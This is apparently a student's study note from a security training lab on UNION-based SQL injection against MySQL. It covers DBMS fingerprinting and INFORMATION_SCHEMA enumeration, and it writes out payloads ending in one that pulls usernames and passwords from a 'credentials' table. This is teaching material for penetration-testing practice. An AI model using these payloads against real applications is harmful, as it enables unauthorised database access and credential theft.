## MySQL Fingerprinting
* First identify the DBMS
* When we see the web server uses `Apache` or `Nginx` it is a good guess that the web server is running on Linux, so the DBMS is likely `MySQL`
* The same also applies to Microsoft DBMS if the webserver is `IIS`, so it is likely to be `MSSQL`
* `MySQL`
	* `@@version` When we have full query output, In MSSQL it returns MSSQL version, Error with other DBMS.
	* `SELECT POW(1,1)`, When we only have numeric output, Error with other DBMS
	* `SELECT SLEEP(5)`, Blind/No Output, Will not delay response with other DBMS

## INFORMATION_SCHEMA Database
* To pull data from tables we need a proper select query
* For that we need the following information
	-   List of databases
	-   List of tables within each database
	-   List of columns within each table
- The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server
- We cannot call its tables directly with a `SELECT` statement
- To reference a table present in another DB, we can use the dot ‘`.`’ operator
- E.g. to `SELECT` a table `users` present in a database named `my_database`

```sql
SELECT * FROM my_database.users;
```

## SCHEMATA
* The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

**Note**: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

![[../../Screenshots/ports_dbs.png]]

* Find out which database the web application is running to retrieve ports data from

```sql
cn' UNION select 1,database(),2,3-- -
```

![[../../Screenshots/db_name.jpg]]

## TABLES
* We need to get a list of the tables to query them with a `SELECT` statement
* We can use the `TABLES` table in the `INFORMATION_SCHEMA` Database
	* Contains information about all tables throughout the database`
	* `TABLE_NAME` column stores table names
	* `TABLE_SCHEMA` column points to the database each table belongs to

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

## COLUMNS
* We first need to find the column names in the table, which can be found in the `COLUMNS` table in the `INFORMATION_SCHEMA` database
* `COLUMN_NAME`, `TABLE_NAME`

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

## Data
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

**Remember**: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.
